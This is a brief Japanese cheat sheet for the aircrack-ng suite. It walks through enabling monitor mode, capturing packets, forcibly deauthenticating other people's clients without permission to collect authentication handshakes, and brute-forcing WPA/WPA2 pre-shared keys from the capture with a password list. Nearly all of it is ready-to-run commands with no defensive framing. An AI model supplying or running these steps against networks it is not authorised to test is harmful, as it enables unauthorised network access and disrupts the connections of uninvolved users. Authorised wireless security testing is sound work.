aircrack-ng
===


### 無線NICのリストを表示

```bash
$ sudo airmon-ng
```

### NICを利用してる他のプロセスを殺す

```bash
$ sudo airmon-ng check kill
```

### パケットキャプチャを有効化

```bash
$ sudo airmon-ng start wlp3s0
```

これでwlp3s0monというNICが生える

### パケットキャプチャの開始

```bash
$ sudo airodump-ng wlp3s0 --bssid <bssid>  -w <filename>
$ sudo airodump-ng wlp3s0 --essid <essid>  -w <filename>
```

filename-01.{cap,csv,kismet...}ができる

### より認証時のパケットを集めるために、他人を勝手にdeauthenticateする

```bash
$ sudo aireplay-ng --deauth 1 -a <bssid> -c <client mac address> wlp3s0
```

client mac addressはairodumpの結果から適当に引っ張ってくる

### 鍵計算

WPA/WPA2 PSK(pre shared key)を総当り計算する

```bash
$ sudo aircrack-ng <option> *.cap
```

optionはいろいろあるっぽい

- -e <essid>
- -b <bssid>
- -c : search only alpha-numeric
- -w <filename> : passwird list

### パケットキャプチャモードの停止

```bash
$ sudo airmon-ng stop wlp3s0mon
